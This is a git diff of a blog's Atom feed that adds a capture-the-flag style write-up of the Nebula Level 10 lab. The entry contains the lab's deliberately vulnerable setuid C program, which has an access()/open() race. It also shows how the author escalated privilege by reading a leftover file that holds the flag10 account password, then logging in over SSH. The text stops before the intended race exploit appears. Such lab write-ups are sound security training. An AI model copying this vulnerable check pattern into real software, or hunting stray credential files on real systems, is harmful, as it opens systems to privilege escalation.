@@ -5,7 +5,7 @@
   
   <link href="https://nitesculucian.github.io/feed.xml" rel="self" type="application/atom+xml" />
   <link href="https://nitesculucian.github.io/" rel="alternate" type="text/html" hreflang="en" />
-  <updated>2018-07-15T20:46:29-03:00</updated>
+  <updated>2018-07-16T17:11:10-03:00</updated>
   <id>https://nitesculucian.github.io//</id>
 
   
@@ -24,6 +24,2069 @@
     </author>
   
 
+  
+  
+    <entry>
+      
+      <title type="html">Exploit Exercises: Nebula Level 10</title>
+      
+      
+      <link href="https://nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-10/" rel="alternate" type="text/html" title="Exploit Exercises: Nebula Level 10" />
+      
+      <published>2018-07-16T15:49:00-03:00</published>
+      <updated>2018-07-16T15:49:00-03:00</updated>
+      <id>https://nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-10</id>
+      <content type="html" xml:base="https://nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-10/">&lt;p&gt;&lt;img src=&quot;/uploads/Screenshot%20from%202018-07-16%2000-20-16.png&quot; alt=&quot;Image of Nebula Terminal&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.&lt;/p&gt;
+
+&lt;p&gt;To do this level, log in as the level10 account with the password level10. Files for this level can be found in /home/flag10.&lt;/p&gt;
+
+&lt;h3 id=&quot;source-code&quot;&gt;Source code&lt;/h3&gt;
+
+&lt;p&gt;(basic.c)&lt;/p&gt;
+
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;sys/types.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;fcntl.h&amp;gt;
+#include &amp;lt;errno.h&amp;gt;
+#include &amp;lt;sys/socket.h&amp;gt;
+#include &amp;lt;netinet/in.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s file host&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\t&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;sends file to host if you have access to it&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+  &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;host&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;access&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;R_OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+      &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ffd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+      &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockaddr_in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+      &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
+      &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Connecting to %s:18211 .. &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fflush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+      &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+      &lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockaddr_in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;sin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_family&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;sin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inet_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;sin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;htons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;18211&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockaddr_in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+          &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Unable to connect to host %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+          &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;cp&quot;&gt;#define HITHERE &quot;.oO Oo.\n&quot;
+&lt;/span&gt;      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HITHERE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HITHERE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+          &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Unable to write banner to host %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+          &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#undef HITHERE
+&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Connected!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Sending file .. &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fflush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+      &lt;span class=&quot;n&quot;&gt;ffd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;O_RDONLY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ffd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+          &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Damn. Unable to open file&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+          &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+      &lt;span class=&quot;n&quot;&gt;rc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ffd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+          &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Unable to read from file: %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strerror&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+          &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+      &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+      &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;wrote file!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;You don't have access to %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;
+
+&lt;p&gt;Unfortunately for this challenge, the team from Exploit Exercises forgot an important file straight in the home folder of level 10 user! At first, I could not believe it, but here is the write up of it:&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level10@nebula:~$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;total 11
+drwxr-x--- 1 level10 level10   60 Oct 31 14:43 .
+drwxr-xr-x 1 root    root      60 Aug 27  2012 ..
+-rw-r--r-- 1 level10 level10  220 May 18  2011 .bash_logout
+-rw-r--r-- 1 level10 level10 3353 May 18  2011 .bashrc
+drwx------ 2 level10 level10   60 Oct 31 14:43 .cache
+-rw------- 1 level10 level10   43 Aug 19  2012 .lesshst
+-rw-r--r-- 1 level10 level10  675 May 18  2011 .profile
+-rw------- 1 level10 level10 4283 Aug 19  2012 .viminfo
+-rw-rw-r-- 1 level10 level10  382 Aug 19  2012 x
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level10@nebula:~$&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;Here we can observe the file called &quot;x&quot; and it reveals the following:
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level10@nebula:~$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;x | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;6
+&lt;span class=&quot;go&quot;&gt;615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level10@nebula:~$&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;Hmmm, weeeeellll…​ That’s the password of your target account called flag10. Let’s take the flag!
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level10@nebula:~$&lt;/span&gt; ssh flag10@localhost
+&lt;span class=&quot;go&quot;&gt;The authenticity of host 'localhost (127.0.0.1)' can't be established.
+ECDSA key fingerprint is ea:8d:09:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
+
+      _   __     __          __
+     / | / /__  / /_  __  __/ /___ _
+    /  |/ / _ \/ __ \/ / / / / __ `/
+   / /|  /  __/ /_/ / /_/ / / /_/ /
+  /_/ |_/\___/_.___/\__,_/_/\__,_/
+
+    exploit-exercises.com/nebula
+
+
+For level descriptions, please see the above URL.
+
+To log in, use the username of &quot;levelXX&quot; and password &quot;levelXX&quot;, where
+XX is the level number.
+
+Currently there are 20 levels (00 - 19).
+
+
+flag10@localhost's password:
+Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)
+
+ * Documentation:  https://help.ubuntu.com/
+New release '12.04 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;The programs included with the Ubuntu system are free software;&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;flag10@nebula:~$&lt;/span&gt; getflag
+&lt;span class=&quot;go&quot;&gt;You have successfully executed getflag on a target account
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;flag10@nebula:~$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And that’s it! We have completed out task. What we learned? Nothing! Now let’s get back to the intended task.
+Contents of the flag10 user account home folder:&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level10@nebula:/home/flag10$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;total 14
+drwxr-x--- 2 flag10 level10   93 Nov 20  2011 .
+drwxr-xr-x 1 root   root      60 Aug 27  2012 ..
+-rw-r--r-- 1 flag10 flag10   220 May 18  2011 .bash_logout
+-rw-r--r-- 1 flag10 flag10  3353 May 18  2011 .bashrc
+-rw-r--r-- 1 flag10 flag10   675 May 18  2011 .profile
+-rwsr-x--- 1 flag10 level10 7743 Nov 20  2011 flag10
+-rw------- 1 flag10 flag10    37 Nov 20  2011 token
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level10@nebula:/home/flag10$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And here are the most important files:&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level10@nebula:/home/flag10$&lt;/span&gt; file flag10
+&lt;span class=&quot;go&quot;&gt;flag10: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, not stripped
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level10@nebula:/home/flag10$&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;And the surprise:
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level10@nebula:/home/flag10$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;token
+&lt;span class=&quot;go&quot;&gt;cat: token: Permission denied
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level10@nebula:/home/flag10$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I bet we have to retrieve the token somehow in order to log in to our target account log10 (same as in the above file). Let’s take a look at our files.&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level10@nebula:/home/flag10$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;total 14
+drwxr-x--- 2 flag10 level10   93 Nov 20  2011 .
+drwxr-xr-x 1 root   root      60 Aug 27  2012 ..
+-rw-r--r-- 1 flag10 flag10   220 May 18  2011 .bash_logout
+-rw-r--r-- 1 flag10 flag10  3353 May 18  2011 .bashrc
+-rw-r--r-- 1 flag10 flag10   675 May 18  2011 .profile
